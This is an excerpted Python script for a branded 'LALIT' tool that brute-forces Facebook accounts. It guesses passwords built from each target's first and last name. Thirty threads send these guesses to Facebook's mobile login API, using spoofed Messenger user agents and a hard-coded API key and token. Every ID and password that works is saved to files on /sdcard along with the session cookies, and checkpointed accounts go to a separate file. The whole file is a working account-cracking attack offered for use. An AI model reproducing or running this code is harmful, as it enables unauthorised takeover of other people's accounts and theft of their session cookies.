...
try: 
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[LALIT]')
...
try:
    ...
    print('\x1b[1;92m[✓] PLEASE WAIT CHECKING LALIT UPDATE...')
...
def randBuildLSB():
    ...
    END = '[FBAN/Orca-Android;FBAV/152.0.0.7014;FBBV/347254895;FBDM/{density=2.0,width=720,height=1426};FBLC/ru_RU;FBRV/423993507;FBCR/Ufone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
...
def randBuildvsskj():
    ...
    return ua
#××××××××××(COLOR'S)××××××××××#
sys.stdout.write('\x1b]2; LALIT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
|    |    /  /_\  \|    |   |   | |    |   
|    |___/    |    \    |___|   | |    |   
|_______ \____|__  /_______ \___| |____|   
        \/       \/        \/              

\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××××
\033[1;33m MAKER     >    \033[1;36mLALIT
\033[1;34m GITHUB    >    \033[1;33mLALIT-X
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'×')
        input(" PRESS ENTER TO BACK LALIT GOD MENU ")
        exit()
#××××××××××(MAIN-MENU)××××××××××#
def LALIT():   
    os.system('clear')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[\033[1;32m LALIT ] {loop} | \033[1;33mM1\033[1;34m OK/\033[1;35mCP\033[1;36m {len(oks)}/\033[1;37m{len(cps)} | \033[1;32m{S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/152.0.0.7014;FBBV/347254895;FBDM/{density=2.0,width=720,height=1426};FBLC/ru_RU;FBRV/423993507;FBCR/Ufone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2059;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [LALIT-OK] {sid} | {ps} {S}")
    
                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/LALIT_OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/LALIT_IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [LALIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/LALIT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ LALIT ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/LALIT_OK_IDs_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/LALIT_IDs_COOKIES_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/LALIT_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/LALIT_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [CHECK POINT] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ LALIT ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/LALIT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            with LALITgod(max_workers=30) as LALITworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                LALITworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                LALITworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                LALITworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                LALITworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
